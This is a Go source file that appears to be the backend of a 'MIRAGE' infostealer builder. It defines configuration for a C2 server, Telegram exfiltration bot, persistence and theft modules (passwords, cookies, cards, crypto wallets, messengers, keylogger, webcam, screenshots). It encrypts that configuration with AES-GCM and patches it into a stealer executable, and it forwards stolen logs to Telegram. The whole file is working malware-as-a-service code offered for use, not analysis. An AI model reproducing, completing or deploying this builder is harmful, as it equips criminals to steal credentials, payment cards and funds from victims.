package services

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"time"
)

const configSignature = "MIRAGECFG"

type Modules struct {
	Passwords  bool `json:"passwords"`
	Cookies    bool `json:"cookies"`
	Cards      bool `json:"cards"`
	Wallets    bool `json:"wallets"`
	Messengers bool `json:"messengers"`
	Gaming     bool `json:"gaming"`
	Vpn        bool `json:"vpn"`
	Keylogger  bool `json:"keylogger"`
	Webcam     bool `json:"webcam"`
	Screenshot bool `json:"screenshot"`
}

type BuildConfig struct {
	C2Host            string   `json:"c2_host"`
	C2Port            int      `json:"c2_port"`
	ApiKey            string   `json:"api_key"`
	TelegramToken     string   `json:"telegram_token"`
	TelegramChatID    string   `json:"telegram_chat_id"`
	EnablePersistence bool     `json:"enable_persistence"`
	EnableScreenshot  bool     `json:"enable_screenshot"`
	EnableGrabber     bool     `json:"enable_grabber"`
	IncludeDecryptor  bool     `json:"include_decryptor"`
	BuildTag          string   `json:"build_tag"`
	StartupDelayMs    int      `json:"startup_delay_ms"`
	DomainDetect      []string `json:"domain_detect"`
	Modules           Modules  `json:"modules"`
	NotifyBots        []string `json:"notify_bots"`
}

type BuildService struct{}

func NewBuildService() *BuildService {
	return &BuildService{}
}

func (s *BuildService) Build(stealerExe []byte, decryptorDll []byte, config BuildConfig) ([]byte, error) {
	sigIdx := bytes.Index(stealerExe, []byte(configSignature))
	if sigIdx < 0 {
		return nil, errors.New("MIRAGECFG signature not found")
	}

	jsonData, err := json.Marshal(config)
	if err != nil {
		return nil, fmt.Errorf("serialize config: %w", err)
	}

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("generate key: %w", err)
	}
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("generate nonce: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("create cipher: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("create gcm: %w", err)
	}
	sealed := gcm.Seal(nil, nonce, jsonData, nil)
	// gcm.Seal returns ciphertext || tag (tag is last Overhead() bytes)
	// Zig decryptConfig expects: key(32) | nonce(12) | tag(16) | ciphertext(N)
	tagSize := gcm.Overhead()
	tag := sealed[len(sealed)-tagSize:]
	ciphertext := sealed[:len(sealed)-tagSize]

	payload := make([]byte, 0, 44+len(sealed))
	// Preserve the MIRAGECFG marker so Zig can find it at runtime
	payload = append(payload, []byte(configSignature)...)
	payload = append(payload, key...)
	payload = append(payload, nonce...)
	payload = append(payload, tag...)
	payload = append(payload, ciphertext...)

	result := make([]byte, len(stealerExe))
	copy(result, stealerExe)

	end := sigIdx + len(payload)
	if end > len(result) {
		return nil, errors.New("config too large for placeholder space")
	}
	copy(result[sigIdx:], payload)

	if len(decryptorDll) > 0 {
		result = append(result, decryptorDll...)
	}

	return result, nil
}

type TelegramProxy struct {
	client  *http.Client
	BaseURL string
}

func NewTelegramProxy() *TelegramProxy {
	return &TelegramProxy{
		client: &http.Client{
			Timeout: 30 * time.Second,
		},
		BaseURL: "https://api.telegram.org",
	}
}

func (p *TelegramProxy) SendLog(token, chatID string, data []byte, filename, caption string) error {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	if err := writer.WriteField("chat_id", chatID); err != nil {
		return fmt.Errorf("write chat_id field: %w", err)
	}
	if err := writer.WriteField("caption", caption); err != nil {
		return fmt.Errorf("write caption field: %w", err)
	}

	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return fmt.Errorf("create form file: %w", err)
	}
	if _, err := part.Write(data); err != nil {
		return fmt.Errorf("write file data: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("close writer: %w", err)
	}

	url := fmt.Sprintf("%s/bot%s/sendDocument", p.BaseURL, token)

	var lastErr error
	for i := 0; i < 3; i++ {
		req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body.Bytes()))
		if err != nil {
			lastErr = fmt.Errorf("create request: %w", err)
			time.Sleep(time.Second)
			continue
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())

		resp, err := p.client.Do(req)
		if err != nil {
			lastErr = fmt.Errorf("send request: %w", err)
			time.Sleep(time.Second)
			continue
		}

		if resp.StatusCode == http.StatusOK {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			return nil
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		lastErr = fmt.Errorf("telegram API returned status %d", resp.StatusCode)
		time.Sleep(time.Second)
	}

	return lastErr
}

func (p *TelegramProxy) TestToken(token string) error {
	url := fmt.Sprintf("%s/bot%s/getMe", p.BaseURL, token)
	resp, err := p.client.Get(url)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(body))
	}

	var result struct {
		Ok bool `json:"ok"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return fmt.Errorf("parse response: %w", err)
	}
	if !result.Ok {
		return errors.New("telegram API returned ok=false")
	}

	return nil
}
